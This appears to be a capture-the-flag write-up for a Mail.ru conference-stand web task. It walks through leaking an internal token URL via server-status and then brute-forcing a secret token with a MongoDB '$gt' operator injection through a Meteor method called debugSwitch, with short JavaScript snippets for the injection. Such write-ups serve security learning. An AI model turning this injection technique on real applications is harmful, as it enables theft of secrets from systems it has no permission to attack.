# Web Task at Mail.ru's stand
## Prizes:
### Stage 1
Coupon for additional $100 on HackerOne for mail.ru/ICQ + Stickers (day 1 only?..)
### Stage 2
Hoodie

## Story/Task
Connect to wifi network, hack the server, toggle two physical switches to change path of the email (ball).

## Solution
### Stage 1
Connect to the network, look at /robots.txt:
> First flag at server-status

Go to server-status, look for requests coming from 127.0.0.1:
http://192.168.199.16:3000/turn?switch=internal&enable=X&token=XXXXXXXXXXXXXX

Stage 1 also suggests that code is 14 chars long and consists of `[0-9a-z]`

### Stage 2
Main page is a Meteor-based app, which shows "security state".
Original JS code is in `d53dd9c05a68891eb350741dda06deb8a5dcb56f.js`

Beautify, remove all the libs/polyfills (see `beautify.js`)

Look at route `/turn`:
```js
var n = u.findOne();
n.externalCode === e.token
  ? (r("3"),...)
  : this.response.end("Wrong token");
```

`e` is request query params
`u` is `new Mongo.Collection("security")`

so, the goal is to extract `externalCode`.

Look a bit further:
```js
i.methods({
  debugSwitch: (function() {
    function e(e, t) {
      var n = { internalSafe: 1, externalSafe: 1 };
      for (var r in meteorBabelHelpers.sanitizeForInObject(t));
      return u.find(e, { fields: n }).fetch();
    }
    return e;
  })()
});
```

`e` is fully controlled by client, and is passed to `Mongo.Collection.find`

Mongo allows us to specify condition operators, like `$gt`.
So, following code would either log array with one object (security state) if condition is true, or would log nothing/empty array if condition is false:
```js
Meteor.call('debugSwitch', {externalCode: {$gt: c}}, (err, res) => console.log(res))
```

that allows us to perform char-by-char binary search based bruteforce of the code.

Finding the vuln and the way to trigger it was easy, but writing an exploit wasn't that obvious.

First step is to turn the callback approach into something more usable -- native Promise which could be awaited:

```js
const debugSwitchGT = c=>new Promise((res, rej)=>Meteor.call('debugSwitch', {externalCode: {$gt: c}}, (e,r)=>e?rej(e):res(!!r[0])))
```

so, `await debugSwitchGT(hax)` would return externalCode>hax.

Final exploit is avaliable at hackit.js.